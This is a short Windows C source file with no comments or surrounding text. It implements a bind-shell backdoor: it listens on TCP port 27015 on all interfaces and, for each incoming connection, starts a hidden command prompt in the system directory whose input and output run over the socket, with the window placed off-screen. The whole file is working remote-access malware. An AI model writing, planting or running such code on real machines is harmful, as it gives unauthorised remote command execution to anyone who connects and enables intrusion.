#include <winsock2.h>
#include <windows.h>
 
char szSystemDir[MAX_PATH + 1];
 
DWORD CALLBACK Thread_ShellSpawner(LPVOID lpParam) {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    SOCKET sClient = (SOCKET)lpParam;     
    memset(&si, 0, sizeof(STARTUPINFO));
    si.cb = sizeof(STARTUPINFO);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW | STARTF_USEPOSITION;
    si.wShowWindow = SW_HIDE;
    si.hStdError = si.hStdInput = si.hStdOutput = (HANDLE)sClient;
    si.dwX = GetSystemMetrics(SM_CXSCREEN);
    si.dwY = GetSystemMetrics(SM_CYSCREEN);     
    SetCurrentDirectory(szSystemDir);
    CreateProcess(NULL, "cmd", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    closesocket(sClient);
    return 0;
}
 
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2,2), &wsaData); 
    SOCKET sServer = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);     
    struct sockaddr_in sockAddr;
    sockAddr.sin_family = AF_INET;
    sockAddr.sin_port = htons(27015);
    sockAddr.sin_addr.s_addr = htonl(INADDR_ANY);
    int sockAddrLen = sizeof(sockAddr);
    bind(sServer, (struct sockaddr *)&sockAddr, sockAddrLen);
    listen(sServer, 1); 
    GetSystemDirectory(szSystemDir, MAX_PATH); 
    while(TRUE){
        SOCKET sClient = accept(sServer, (struct sockaddr*)&sockAddr, &sockAddrLen);
        if(sClient == SOCKET_ERROR) break;
        CreateThread(NULL, 0, Thread_ShellSpawner, (LPVOID)sClient, 0, NULL);
    }     
    WSACleanup();
    return 0;
}
